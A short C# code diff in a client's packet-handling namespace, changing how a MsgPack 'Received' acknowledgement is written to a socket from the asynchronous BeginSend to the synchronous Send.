@@ -225,7 +225,7 @@ namespace Client.Handle_Packet
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Received";
-            ClientSocket.BeginSend(msgpack.Encode2Bytes());
+            ClientSocket.Send(msgpack.Encode2Bytes());
         }
 
     }
